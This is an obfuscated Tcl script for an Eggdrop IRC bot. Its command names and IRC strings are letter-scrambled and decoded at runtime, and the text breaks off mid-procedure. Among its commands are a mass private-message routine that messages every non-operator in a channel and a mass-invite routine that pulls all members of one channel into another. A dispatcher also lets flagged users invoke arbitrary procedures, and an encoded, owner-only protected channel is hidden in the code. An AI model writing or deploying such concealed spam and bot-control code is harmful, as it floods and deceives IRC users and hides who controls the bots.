proc [lines "kfy_rmergv"] {nick uhost hand chan rest} {
global notc 
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: rmergv <mrxp> <#xszmmvo>"
}
set [lines "dsl"] [lindex $rest 0]
set [lines "glxszm"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$tochan != ""} {
if {![onchan $who $tochan]} {
puthlp "RMERGV ~$who ~:~$tochan"
puthlp "MLGRXV ~$nick ~:~$notc ~RmeRgV ~$who ~Gl ~$tochan"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$who ~rh zoivzwb lm gsv ~$tochan"
}
if {![onchan $who $chan]} {
putsrv "RMERGV ~$who ~:~$chan"
puthlp "MLGRXV ~$nick ~:~$notc ~Rmergzgrlm gl ~$chan ~szh yvvm hvmg gl ~$who"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$who ~rh zoivzwb lm gsv xszmmvo"
}
proc [lines "nht_A"] {nick uhost hand rest} {
global notc
if {[string index $rest 0] != "`" && [string index $rest 0] != "."} { return 0 }
if {![matchattr $nick Z]} { return 0 }
if {[string index [lindex $rest 1] 0] == "#"} {
if {![validchan [lindex $rest 1]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~[lindex $rest 1]~"
return 0
}
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4zfgs 1hg!"
return 0
}
set [lines "tlgl"] [lindex $rest 0]
if {[string index $rest 0] == "."} {
regsub "." $goto "msg_" goto
set [lines "ivhg"] [lrange $rest 1 end]
catch { $goto $nick $uhost $hand $rest }
return 0
}
regsub -all "`" $goto "pub_" goto
if {[string index [lindex $rest 1] 0] == "#"} {
set [lines "xszm"] [lindex $rest 1]
set [lines "ivhg"] [lrange $rest 2 end]
} else {
set [lines "xszm"] "*"
set [lines "ivhg"] [lrange $rest 1 end]
}
catch { $goto $nick $uhost $hand $chan $rest }
}
proc [lines "nht_nnht"] {nick uhost hand rest} {
pub_mmsg $nick $uhost $hand "*" $rest
}
proc [lines "kfy_nnht"] {nick uhost hand chan rest} {
global cmd_chn cmd_by cmd_msg cmd_case notc
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nnht <#xszmmvo> <gvcg>"
return 0
}
set [lines "glxszm"] [lindex $rest 0]
set [lines "gcg"] [lrange $rest 1 end]
if {$txt==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nnht <#xszmmvo> <gvcg>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string first # $tochan] != 0} { 
set [lines "xszm"] "#$tochan" 
}
if {![validchan $tochan]} {
set [lines "xnw_xsm"] $tochan
set [lines "xnw_nht"] $rest
set [lines "xnw_yb"] $nick
set [lines "xnw_xzhv"] "2"
channel add $tochan
catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
putsrv "MLGRXV ~$nick ~:~$notc ~HGzIGRMT NzHHNHT ~$tochan"
set [lines "nvnyvih"] [chanlist $tochan]
foreach x $members {
if {![isop $x $tochan]} {
puthlp "KIRENHT ~$x ~:~$txt"
}
}
utimer 2 del_nobase
puthlp "MLGRXV ~$nick ~:~$notc ~NzHHNHT ~$tochan ~4WlMV."
}
proc [lines "kfy_nrmergv"] {nick uhost hand channel rest} {
global cmd_chn cmd_by cmd_msg cmd_case botnick notc 
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nrmergv <#xszmmvo> <#gl xszmmvo>"
}
set [lines "xszm"] [lindex $rest 1]
if {$chan == ""} {
set [lines "xszm"] $channel
} else {
if {[string first # $chan] != 0} { 
set [lines "xszm"] "#$chan" 
}
}
set [lines "glxszm"] [lindex $rest 0]
if {[string first # $tochan] != 0} { 
set [lines "glxszm"] "#$tochan" 
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {![validchan $tochan]} { 
set [lines "xnw_xsm"] $tochan
set [lines "xnw_nht"] $tochan
set [lines "xnw_yb"] $nick
set [lines "xnw_xzhv"] "3"
channel add $tochan
catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
if {[isop $botnick $chan]} { 
putserv "mode $chan -o $botnick" 
}
putsrv "MLGRXV ~$nick ~:~$notc ~Hgzigrmt nzhh rmergv gl ~$tochan"
set [lines "nvnyvih"] [chanlist $tochan]
foreach x $members {
if {(![onchan $x $chan]) && (![isop $x $tochan])} { 
putsrv "RMERGV ~$x ~:~$chan"
}
}
utimer 2 del_nobase
puthlp "MLGRXV ~$nick ~:~$notc ~RmERGV ~$tochan ~RmGL ~$chan ~4WlMV."
}
proc [lines "kfy_qlrm"] {nick uhost hand chan rest} {
global botnick joinme own notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan] != 0} { 
set [lines "xszm"] "#$chan" 
}
if {$chan=="#"} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: qlrm <#xszmmvo>"
return 0
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$x ~IvZWB!"
return 0
}
}
if {$nick != $own && [total_channel] != 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Gl NzMB xSzMMvO NzC 9..!"
return 0
}
set [lines "qlrmnv"] $nick
channel add $chan
catch { channel set $chan +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
if {[lindex $rest 1] != ""} { 
putsrv "QLRM ~$chan ~:~[lindex $rest 1]~" 
}
}
proc [lines "kfy_+xszm"] {nick uhost hand chan rest} {
global botnick joinme owner notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!YOlXpVw!"
return 0
}
set [lines "xszm"] [lindex $rest 0]
set [lines "lkg"] [lindex $rest 1]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
if {$chan=="#"} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +xszm <#xszmmvo>"
return 0
}
if {[validchan $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chan ~rh zoivzwb lm xszmmvoh"
return 0
}
if {$nick != $owner && [total_channel] != 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~GL NzMB xSzMMvO NzC 9..!"
return 0
}
set [lines "qlrmnv"] $nick
channel add $chan
if {$opt != "" && [string tolower $opt] == "+nopart"} { 
catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
} else {
catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
}
savechan
if {[lindex $rest 1] != ""} { 
putsrv "QLRM ~$chan ~:~[lindex $rest 1]~" 
}
}
proc [lines "glgzo_xszmmvo"] {} {
global notc 
set [lines "glgzo_xszm"] 0
foreach x [channels] {
incr total_chan
}
if {$total_chan > 9} { return 0 }
return 1
}
proc [lines "kfy_kzig"] {nick uhost hand chan rest} { 
global notc ps quick
set [lines "xfigrnv"] [ctime [unixtime]]
set [lines "kzig_nht"] [lrange $rest 1 end]
if {$rest != ""} { 
set [lines "xszm"] [lindex $rest 0]
if {[string first # $rest]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {$nick != $ps && [string tolower $chan] == [dezip "PK6~m.0G/7xb1"]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*+secret*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chan ~4KIlGvxGVw..!"
return 0
}
if {![onchan $nick $chan]} { 
putsrv "MLGRXV ~$nick ~:~$notc ~KzIG ~$chan"
}
if {$part_msg != ""} {
if {$quick == "1"} {
putqck "KZIG ~$chan ~:~$part_msg"
} {
putsrv "KZIG ~$chan ~:~$part_msg"
}
} {
if {$quick == "1"} {
putqck "KZIG ~$chan ~:YzxpGlYzhv (Lm ~$curtime)"
} {
putsrv "KZIG ~$chan ~:YzxpGlYzhv (Lm ~$curtime)"
}
}
channel remove $chan
savechan
return 0
}
set [lines "olxpxszm"] ""
proc [lines "kfy_+rmergvolxp"] {nick uhost hand chan rest} {
global lockchan notc 
if {$rest != ""} { 
set [lines "xszm"] [lindex $rest 0]
if {[string first # $rest]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~RmERGV xSzM ~$chan ~\[9LM\]"
set [lines "olxpxszm"] $chan
return 0
}
proc [lines "kfy_-rmergvolxp"] {nick uhost hand chan rest} { 
global lockchan notc 
if {$rest != ""} { 
set [lines "xszm"] [lindex $rest 0]
if {[string first # $rest]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan] || $lockchan == ""} { return 0 }
set [lines "olxpxszm"] ""
puthlp "MLGRXV ~$nick ~:~$notc ~RmeRgV xSzM ~$chan ~\[4LUU\]"
return 0
}
proc [lines "xbxov"] {chan} {
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![string match "*c*" [getchanmode $chan]]} {
set [lines "gvcg"] [cyclemsg]
} {
set text "((((cycle))))"
}
putsrv "KZIG ~$chan ~:~$text"
if {[matchattr $cflag K]} {
putsrv "QLRM ~$chan ~:~[dezip [getuser $cflag XTRA "CI"]~]"
} {
putsrv "QLRM ~$chan"
}
if {[matchattr $cflag C]} {
if {![istimer "cycle $chan"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $chan] }
}
}
proc [lines "kfy_xbxov"] {nick uhost hand chan rest} {
global notc
set [lines "ivhg"] [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest==""} {
if {![onchan $nick $chan]} { 
puthlp "MLGRXV ~$nick ~:~$notc ~xBxOV ~$chan"
}
cycle $chan
return 0
} else {
if {[string index $rest 0] != "#"} {
set [lines "ivhg"] "#$rest"
}
if {[botonchan $rest]} { cycle $rest }
}
}
proc [lines "kfy_+nzhhqlrm"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist A] {
chattr $x +J
}
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO NzHhQlRM XSzMMvO \[9LM\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[matchattr $cflag J]} {
puthlp "MLGRXV ~$nick ~:~$notc ~NzHhQlRM ~$chan ~\[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +J
puthlp "MLGRXV ~$nick ~:~$notc ~NzHhQlRM ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-nzhhqlrm"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist A] {
chattr $x -J
}
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO NzHhQlRM XSzMMvO \[9LM\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {![matchattr $cflag J]} {
puthlp "MLGRXV ~$nick ~:~$notc ~NzHhQlRM ~$chan ~\[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -J
puthlp "MLGRXV ~$nick ~:~$notc ~NzHhQlRM ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+tfziw"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO TfzIw XSzMMvO \[9LM\]"
return 0
}
if {![validchan $chan]} { return 0 }
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
if {[string match "*+greet*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~TfZIw ~$chan ~\[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
puthlp "MLGRXV ~$nick ~:~$notc ~TfZIW ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-tfziw"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hpJSPTRUED"
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO TfzIw xSzM \[4LUU\]"
return 0
}
if {![validchan $chan]} { return 0 }
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hpJSPTRUED"
if {[string match "*-greet*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~TfZIW ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
puthlp "MLGRXV ~$nick ~:~$notc ~TfZIW ~$chan ~\[4LUU\]"
savechan
return 0
}
proc [lines "kfy_+hvvm"] {nick uhost hand chan rest} {
global notc 
if {![string match "*seen*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}  
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x +seen }
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO HVVM xSzMMvO \[9LM\]"
seen
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*+seen*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HVVM ~$chan ~RH \[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +seen }
puthlp "MLGRXV ~$nick ~:~$notc ~HVVM ~$chan ~\[9LM\]"
savechan
seen
}
proc [lines "kfy_-hvvm"] {nick uhost hand chan rest} {
global notc 
if {![string match "*seen*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x -seen }
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO HVVM xSzMMvO \[4LUU\]"
seen
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*-seen*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HVVM ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -seen }
puthlp "MLGRXV ~$nick ~:~$notc ~HVVM ~$chan ~\[4LUU\]"
savechan
seen
return 0
}
proc [lines "kfy_+zfglprxp"] {nick uhost hand chan rest} {
global notc
if {![string match "*nodesynch*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}  
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+nodesynch*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLPRxP ~$chan ~RH \[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +nodesynch }
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLPRxP ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-zfglprxp"] {nick uhost hand chan rest} {
global notc
if {![string match "*nodesynch*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-nodesynch*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLPRxP ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -nodesynch }
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLPRxP ~$chan ~\[4LUU\]"
savechan
return 0
}
proc [lines "kfy_+ivlk"] {nick uhost hand chan rest} {
global notc
if {![string match "*protectfriends*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}  
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-protectfriends*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Iv@k ~$chan ~RH \[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -protectfriends }
puthlp "MLGRXV ~$nick ~:~$notc ~Iv@k ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-ivlk"] {nick uhost hand chan rest} {
global notc
if {![string match "*protectfriends*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+protectfriends*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Iv@k ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +protectfriends }
puthlp "MLGRXV ~$nick ~:~$notc ~Iv@k ~$chan ~\[4LUU\]"
savechan
return 0
}
proc [lines "kfy_+wlmgprxplkh"] {nick uhost hand chan rest} {
global notc
if {![string match "*userinvites*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}  
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-userinvites*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~WlMGPRxP@KH ~$chan ~RH \[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -userinvites }
puthlp "MLGRXV ~$nick ~:~$notc ~WlMGPRxP@KH ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-wlmgprxplkh"] {nick uhost hand chan rest} {
global notc
if {![string match "*userinvites*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~UOZt MlG ZEzROzYOV FkTIzwV VttWILK EvI"
return 0
}
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+userinvites*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~WlMGPRxP@KH ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +userinvites }
puthlp "MLGRXV ~$nick ~:~$notc ~WlMGPRxP@KH ~$chan ~\[4LUU\]"
savechan
return 0
}
proc [lines "kfy_+hgzgfh"] {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+shared*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HGzGFH ~$chan ~\[9LM\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +shared }
puthlp "MLGRXV ~$nick ~:~$notc ~HGzGfH ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-hgzgfh"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-shared*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HGzGfH ~$chan ~RH \[4LUU\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -shared }
puthlp "MLGRXV ~$nick ~:~$notc ~HGzGfH ~$chan ~\[4LUU\]"
savechan
return 0
}
proc [lines "kfy_+mlkzig"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x +secret }
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO xSzMMvO HvG MlKZIG \[9LM\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*+secret*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlKZIG ~$chan ~RH \[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +secret }
puthlp "MLGRXV ~$nick ~:~$notc ~HvG MlKZIG ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-mlkzig"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x -secret }
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO xSzMMvO MlKZIG \[4LUU\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*-secret*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlKZIG ~$chan ~RH \[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan -secret }
puthlp "MLGRXV ~$nick ~:~$notc ~MlKZIG ~$chan ~\[4LUU\]"
savechan
}
proc [lines "kfy_+zprxp"] {nick uhost hand channel param} {
global botname botnick notc botnick
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +zprxp <slhgmznv>"
return 0
}
if {$rest == "*" || $rest == "*!*@*"} {
puthlp "MLGRXV ~$nick ~:~$notc ~rmezorw slhgmznv..!"
return 0
}
if {$rest == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb lm wzgzyzhv drgs uozth: ~[chattr $rest]~"
return 0
}  
if {![string match "*@*" $rest]} {
set [lines "ivhg"] "$rest!*@*"
}
if {[string match $rest $botname]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[finduser $rest] != "*"} {
if {[finduser $rest] != "AKICK"} {
puthlp "MLGRXV ~$nick ~:~$notc ~Gszg Slhg Yvolmth Gl ~[finduser $rest]~"
}
puthlp "MLGRXV ~$nick ~:~$notc ~Gszg Slhg zoivzwb rm ~[finduser $rest]~"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl PRxPORhG..!"
setuser "AKICK" HOSTS $rest
saveuser
foreach x [channels] {
if {[isop $botnick $x]} {
foreach c [chanlist $x K] {
if {![matchattr $c f]} {
akick_chk $c [getchanhost $c $x] $x
}
}
}
}
return 0
}
proc [lines "kfy_-zprxp"] {nick uhost hand channel param} {
global notc 
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -zprxp <slhgmznv>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {![string match "*@*" $rest]} {
set [lines "ivhg"] "$rest!*@*"
}
set [lines "xlnkovgvw"] 0
foreach * [getuser "AKICK" HOSTS] {
if {${rest} == ${*}} {
delhost "AKICK" $rest
set [lines "xlnkovgvw"] 1
}
}
if {$completed == 0} {
